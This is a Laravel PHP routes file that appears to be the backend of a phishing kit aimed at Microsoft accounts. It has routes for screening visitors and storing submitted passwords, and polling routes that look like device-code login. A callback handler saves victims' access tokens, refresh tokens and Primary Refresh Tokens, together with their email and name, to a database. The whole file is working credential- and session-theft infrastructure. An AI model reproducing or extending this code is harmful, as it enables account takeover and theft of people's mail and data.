<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\CommandController;
use Illuminate\Support\Facades\Log;
use App\Models\PythonJob;
use App\Jobs\RunPythonJob;
use App\Models\Token;
use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\MicrosoftInboxController;

use Illuminate\Http\Request;

Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {

        header('Content-Type: text/plain');

        echo $request->query('validationToken');

        exit;
    }

    \Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok', 200);
});


Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
// token
Route::post('/start', [MicrosoftAuthController::class, 'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);
// cookies
Route::post('/command/start', [CommandController::class, 'start']);
Route::get('/command/poll/{id}', [CommandController::class, 'poll']);
Route::post('/python/callback', function (Request $request) {

    if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
        return response()->json(['error' => 'unauthorized'], 403);
    }

    Log::info('PYTHON CALLBACK', $request->all());

    $job = PythonJob::find($request->job_id);

    if (!$job) {
        return response()->json(['error' => 'job not found'], 404);
    }

    $job->update([
        'status' => $request->status,
        'result' => $request->status === 'done' ? $request->data : $job->result,
        'error' => $request->status === 'failed' ? $request->error : $job->error,
    ]);

    // 🔥 HANDLE TOKEN
    if ($request->status === 'done') {
        try {
            $data = $request->data;

            $decoded = decodeJwt($data['prt']['id_token'] ?? null);

            $email = $decoded['upn']
                ?? $decoded['unique_name']
                ?? null;

            $name = $decoded['name']
                ?? trim(($decoded['given_name'] ?? '') . ' ' . ($decoded['family_name'] ?? ''));

            Token::create([
                'user_id' => 1,
                'access_token' => $data['access_token'] ?? null,
                'refresh_token' => $data['refresh_token'] ?? null,
                'prt' => $data['prt'],
                'email' => $email,
                'name' => $name,
                'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
                'status' => 'active',
            ]);

        } catch (\Throwable $e) {
            Log::error('TOKEN_SAVE_FAILED', [
                'error' => $e->getMessage(),
                'data' => $request->data
            ]);
        }
    }

    return response()->json(['ok' => true]);
});

Route::get('/python/job/{id}', function ($id) {
    return PythonJob::findOrFail($id);
});

Route::post('/python/start', function () {

    $job = PythonJob::create([
        'status' => 'pending'
    ]);

    // 🔥 jalankan python
    RunPythonJob::dispatch($job->id)->onQueue('python');

    return response()->json([
        'job_id' => $job->id,
        'status' => 'started'
    ]);
});



if (!function_exists('decodeJwt')) {
    function decodeJwt($jwt)
    {
        try {
            if (!$jwt || !is_string($jwt)) {
                return null;
            }

            $parts = explode('.', $jwt);

            if (count($parts) < 2) {
                return null;
            }

            $payload = $parts[1];

            $payload = str_replace(['-', '_'], ['+', '/'], $payload);
            $payload .= str_repeat('=', (4 - strlen($payload) % 4) % 4);

            return json_decode(base64_decode($payload), true);

        } catch (\Throwable $e) {
            return null;
        }
    }
}